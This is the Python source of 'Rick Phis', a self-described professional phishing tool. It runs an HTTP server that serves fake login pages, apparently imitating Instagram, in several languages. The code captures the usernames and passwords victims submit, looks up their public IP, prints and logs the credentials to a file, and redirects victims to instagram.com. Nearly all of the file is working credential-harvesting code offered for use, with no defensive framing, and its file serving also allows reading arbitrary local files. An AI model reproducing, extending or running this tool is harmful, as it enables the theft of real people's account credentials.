from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore, init
import argparse
import requests
import socket
from datetime import datetime

init()

red_color = Fore.RED
white_color = Fore.WHITE
yellow_color = Fore.YELLOW
green_color = Fore.GREEN

current_datetime = datetime.now()
formatted_date = current_datetime.strftime("%d/%m/%Y %H:%M:%S")

year = current_datetime.year
month = current_datetime.month
day = current_datetime.day
hour = current_datetime.hour
minute = current_datetime.minute
second = current_datetime.second

logo = """  _____  _      _      _____  _     _      
 |  __ \\(_)    | |    |  __ \\| |   (_)     
 | |__) |_  ___| | __ | |__) | |__  _ ___  
 |  _  /| |/ __| |/ / |  ___/| '_ \\| / __| 
 | | \\ \\| | (__|   <  | |    | | | | \\__ \\ 
 |_|  \\_\\_|\\___|_|\\_\\ |_|    |_| |_|_|___/"""

accounts = [
    "[1] Normal",  "[2] Security",
    "[3] Verify",  "[4] CLD Tools"
]

print(f"{red_color}{logo}")
print(Fore.WHITE + "\n                     by https://github.com/Rickidevs\n")

for account in accounts:
    number, description = account.split(']', 1)
    print(f'{red_color}[{white_color}{number[1]}{red_color}] {yellow_color}{description.strip()}')

print(Fore.RESET)

language_mapping = {
    'ar': "htmls\\ar.html",
    'az': "htmls\\az.html",
    'ch': "htmls\\ch.html",
    'en': "htmls\\index.html",
    'fr': "htmls\\fr.html",
    'de': "htmls\\de.html",
    'it': "htmls\\it.html",
    'ko': "htmls\\ko.html",
    'ru': "htmls\\ru.html",
    'es': "htmls\\es.html",
    'tr': "htmls\\tr.html"
}

help_menu = f"""{Fore.YELLOW}
Rick Phis - professional phishing tool

Arguments:
  --site  <site_number>     Site number (e.g., 1, 2, 3)
  --lang  <language_code>   Language code (ar,az,ch,en,fr,de,it,ko,ru,es,tr) (default: en)
  --port  <port_number>     Port number (0-65535)
  --output <file_name>      Gets information as output
  --getip                   Get public IP address (default: False)
  -v, --verbose             Print verbose output to console
  --help                    Show this help message and exit
"""

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('google.com', 80))
        ip_address = s.getsockname()[0]
    except Exception as e:
        print("Failed to obtain IP address:", e)
        ip_address = None
    finally:
        s.close()
    return ip_address

def find_empty_port(start_port=8000, end_port=65535):
    for port in range(start_port, end_port + 1):
        if not is_port_in_use(port):
            return port
    print("No free ports were found in the specified range.")
    return None

def is_port_in_use(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('localhost', port))
        s.close()
        return False
    except OSError:
        return True

def main():
    parser = argparse.ArgumentParser(description="Rick Phis - professional phishing tool", usage=argparse.SUPPRESS, add_help=False)
    parser.add_argument('--site','-s', type=int, required=True, help='Site number (e.g., 1, 2, 3)')
    parser.add_argument('--lang','-l', type=str, default='en', help='Language code (e.g., en, tr, de)')
    parser.add_argument('--port','-p', type=int, default=0, help='Port number (0-65535)')
    parser.add_argument('--output','-o', type=str, help='Gets information as output')
    parser.add_argument('--getip', action='store_true', help='Get public IP address')
    parser.add_argument('-v', '--verbose', action='store_true', help='Print verbose output to console')

    try:
        while True:
            user_input = input(Fore.BLUE + "Phish: " + Fore.RESET).strip().split()
            if 'help' in user_input or '-h' in user_input or '--help' in user_input:
                print(help_menu)
                continue
            args = parser.parse_args(user_input)

            if args.port < 0 or args.port > 65535:
                print(Fore.RED + "Port number must be in the range 0-65535!")
                continue

            chosen = args.site
            lang = args.lang
            port = args.port
            getip = args.getip
            output_file = args.output
            verbose = args.verbose

            web_site = language_mapping.get(lang.lower())
            if not web_site:
                print(Fore.RED + "Invalid language code!")
                continue

            if chosen == 1:
                start_server(web_site, port, getip, output_file, verbose)
            else:
                print(f"Site {chosen} is under development. Coming soon!")

    except KeyboardInterrupt:
        print(Fore.YELLOW, "\nRick Phis was stopped (ctrl+c)", Fore.RESET)

def start_server(web_site, port, getip, output_file, verbose):
    class MyHTTPRequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            file_path = self.path.strip('/')
            if file_path == '':
                file_path = web_site

            try:
                if file_path.endswith('.css'):
                    with open(file_path, 'rb') as file:
                        content = file.read()
                        self.send_response(200)
                        self.send_header('Content-type', 'text/css')
                        self.end_headers()
                        self.wfile.write(content)
                else:
                    with open(file_path, 'rb') as file:
                        content = file.read()
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        self.wfile.write(content)
            except FileNotFoundError:
                self.send_error(404, f'File Not Found: {self.path}')
            except Exception as e:
                self.send_error(500, f'Server Error: {e}')

        def do_POST(self):
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                post_data = post_data.split('&')
                data_dict = {}
                for item in post_data:
                    key, value = item.split('=')
                    data_dict[key] = value

                public_ip = self.get_public_ip() if getip else 'N/A'

                log_message = ""
                if verbose and output_file:
                    log_message = f"[{formatted_date}] Username: {data_dict['username']}\n" \
                                  f"[{formatted_date}] Password: {data_dict['password']}\n" \
                                  f"[{formatted_date}] Address:  {public_ip}\n\n"

                if output_file:
                    with open(output_file, 'a') as file:
                        file.write(log_message)

                if verbose:
                    print(f"{Fore.BLUE}[{formatted_date}]", Fore.RED, "Username:", data_dict['username'])
                    print(f"{Fore.BLUE}[{formatted_date}]", Fore.RED, "Password:", data_dict['password'])
                    print(f"{Fore.BLUE}[{formatted_date}]", Fore.RED, "Address:",  public_ip, Fore.RESET)

                self.send_response(302)
                self.send_header('Location', 'https://instagram.com')
                self.end_headers()

                if not verbose:
                    print(Fore.RED,"Username:", data_dict['username'])
                    print(Fore.RED,"Password:", data_dict['password'])
                    print(Fore.RED,"Address:", public_ip, Fore.RESET)
                    
            except Exception as e:
                self.send_error(500, f'Failed to process POST request: {e}')

        def get_public_ip(self):
            try:
                response = requests.get('https://ipleak.net/json/')
                return response.json()['ip']
            except Exception as e:
                print("Failed to obtain public IP address:", e)
                return None

    host = get_ip_address()
    if port:
        if is_port_in_use(port):
            print(Fore.RED, f"The specified port {port} is already in use.")
            return
        c_port = port
    else:
        c_port = find_empty_port()

    if c_port:
        try:
            server = HTTPServer((host, c_port), MyHTTPRequestHandler)
            print(f"{Fore.GREEN}\nServer is started on: http://{host}:{c_port}/\n", Fore.RESET)
            if verbose:
                print(Fore.YELLOW,"Verbose mode is enabled. All output will be logged with timestamps\n",Fore.RESET)
            server.serve_forever()
        except Exception as e:
            print(Fore.RED, f"Failed to start server: {e}")
    else:
        print(Fore.RED, "No free port found.")

if __name__ == "__main__":
    main()
